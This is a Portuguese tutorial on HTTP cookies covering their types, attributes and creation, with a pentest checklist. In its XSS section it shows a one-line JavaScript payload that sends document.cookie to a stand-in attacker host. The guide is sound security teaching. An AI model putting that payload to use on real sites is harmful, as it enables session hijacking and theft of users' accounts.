## O que são Cookies?

Cookies são **pequenos arquivos de texto** que os sites armazenam no navegador do usuário para **guardar informações** entre requisições HTTP. Eles são fundamentais para **manter sessões, lembrar preferências ou rastrear comportamento**.

---

## Tipos de Cookies

### 1. **Cookie de Sessão**

- Criado temporariamente quando o usuário acessa um site.
    
- É **apagado automaticamente** quando o navegador é fechado.
    
- Usado para manter a **sessão de login** ou **estado de navegação**.
    
- Exemplo: Você faz login e navega em várias páginas sem precisar se autenticar de novo.
    

### 2. **Cookie Persistente**

- Fica armazenado mesmo **após fechar o navegador**.
    
- Tem uma data de expiração definida.
    
- Usado para lembrar o login, preferências ou manter o usuário conectado.
    
- Exemplo: “Lembrar-me” em sites de login como Gmail ou Facebook.
    

### 3. **Cookie de Terceiros**

- Criado por **domínios diferentes** do site que você está acessando.
    
- Muito usado em **rastreamento de anúncios** (ex: Google Ads, Facebook Pixel).
    
- Pode gerar riscos à privacidade.
    
- Exemplo: Você acessa um site de notícias e carrega um cookie da DoubleClick (Google).
    

---

## Como os Cookies são Criados?

Eles podem ser criados via **JavaScript** ou enviados pelo **servidor no cabeçalho HTTP**:

### Exemplo via JavaScript:

```javascript
document.cookie = "token=abc123; path=/; expires=Fri, 31 Dec 2025 23:59:59 GMT";
```

### Exemplo via cabeçalho HTTP:

```
Set-Cookie: token=abc123; Path=/; Expires=Fri, 31 Dec 2025 23:59:59 GMT; HttpOnly; Secure
```

---

## Atributos de um Cookie

|Atributo|Descrição|
|---|---|
|**Name**|Nome do cookie (ex: session_id)|
|**Value**|Valor do cookie (ex: abc123token)|
|**Path**|Caminho do site onde o cookie será enviado (ex: `/`, `/admin`)|
|**Domain**|Domínio que pode receber o cookie (ex: `.meusite.com`)|
|**Expires**|Quando o cookie irá expirar (ex: `Tue, 19 Jan 2038 03:14:07 GMT`)|
|**HttpOnly**|Impede o acesso ao cookie por JavaScript (mitiga ataques XSS)|
|**Secure**|Só é enviado em conexões HTTPS|
|**SameSite**|Restringe envio do cookie entre domínios (evita CSRF). Valores: `Strict`, `Lax`, `None`|

---

## Exemplo real de cookie:

```
Set-Cookie: session_id=abc123; Path=/; Domain=meusite.com; Expires=Wed, 21 Oct 2025 07:28:00 GMT; HttpOnly; Secure; SameSite=Lax
```

---

## É possível manipular cookies?

Sim, em muitos cenários, **o atacante pode tentar manipular cookies** se não houver segurança adequada. Exemplos práticos:

### 1. **Session Fixation**

- O atacante força um cookie de sessão válido no navegador da vítima.
    

### 2. **Cookie Tampering**

- Cookies sem assinatura ou criptografia podem ser **editados manualmente**.
    
- Exemplo: Um cookie `role=admin` pode ser alterado por um atacante via DevTools.
    

### 3. **XSS + roubo de cookies**

- Se o cookie **não estiver marcado como `HttpOnly`**, ele pode ser acessado via JavaScript malicioso.
    

```javascript
// Em um XSS
document.location = "https://malicious.com?cookie=" + document.cookie;
```

---

## Como monitorar e visualizar cookies?

- No navegador (F12 > Application > Cookies).
    
- Com ferramentas como:
    
    - **Burp Suite**
        
    - **OWASP ZAP**
        
    - **Postman**
        
    - **Curl (via header Set-Cookie)**
        

---

## Considerações para Pentest

Ao realizar testes em aplicações web, analise:

1. **Cookies sem HttpOnly** – são vulneráveis a roubo via XSS.
    
2. **SameSite=None sem Secure** – pode permitir CSRF.
    
3. **Tokens de sessão previsíveis ou não expirados** – podem ser explorados.
    
4. **Cookies sensíveis não criptografados** – podem ser manipulados.
    
5. **Cookies de terceiros indevidos** – violam privacidade e ajudam em fingerprinting.